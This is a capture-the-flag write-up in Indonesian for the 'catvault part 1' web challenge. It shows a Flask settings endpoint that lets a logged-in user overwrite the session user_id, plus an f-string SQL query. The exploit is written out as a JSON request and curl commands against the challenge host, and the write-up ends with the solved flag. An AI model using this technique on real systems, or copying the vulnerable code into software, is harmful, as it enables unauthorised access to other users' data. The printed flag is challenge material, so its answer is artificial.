# catvault - part 1 writeup

## Ringkasan

Flag dapat diambil melalui broken access control pada session Flask. Endpoint
`/api/settings` menerima key arbitrary dan menyimpannya langsung ke session,
termasuk key `user_id` yang seharusnya tidak boleh diubah oleh user.

## Analisis source

Pada `app.py`, endpoint settings hanya memvalidasi bahwa key berupa string dan
value berupa string:

```python
for key, value in incoming.items():
    if not isinstance(key, str) or key.startswith("_") or not isinstance(value, str):
        continue
    session[key] = value
```

Tidak ada allowlist sehingga user yang sudah login dapat mengirim:

```http
POST /api/settings
Content-Type: application/json

{"user_id":"1"}
```

Fungsi `/vault` lalu meneruskan nilai session tersebut ke database. Query di
`db.py` juga memakai interpolasi string dan mencari berdasarkan `vault.id`:

```python
cursor.execute(f"SELECT id, content FROM vault WHERE id = {user_id};")
```

Admin dibuat lebih dulu saat inisialisasi database, sehingga entry flag berada
pada vault row `id = 1`.

## Langkah eksploitasi manual

1. Register user baru di `/register`.
2. Kirim `{"user_id":"1"}` ke `/api/settings` menggunakan cookie session yang
   didapat saat register.
3. Buka `/vault` dan baca entry admin.

Contoh dengan `curl`:

```bash
curl -c cookies.txt -b cookies.txt -X POST \
  -d 'username=testcat&password=meow' \
  https://catvault-1-f612e540e246.instances.ctf.l3ak.team/register

curl -c cookies.txt -b cookies.txt -X POST \
  -H 'Content-Type: application/json' \
  -d '{"user_id":"1"}' \
  https://catvault-1-f612e540e246.instances.ctf.l3ak.team/api/settings

curl -b cookies.txt \
  https://catvault-1-f612e540e246.instances.ctf.l3ak.team/vault
```

## Solver

Jalankan dari direktori `part1`:

```bash
python3 solve.py
```

Target dapat diganti dengan argumen atau environment variable:

```bash
python3 solve.py https://example-target
CATVAULT_URL=https://example-target python3 solve.py
```

## Flag

```text
L3AK{it_wa5_a_V3Ry_e4sY_web_ch4l13ng3_s0RrY_t0_boRe_YoU_a1l_with_the_dUMB_pRe7eXt_N0w_60_so1v3_tH3_Re4l_0N3}
```
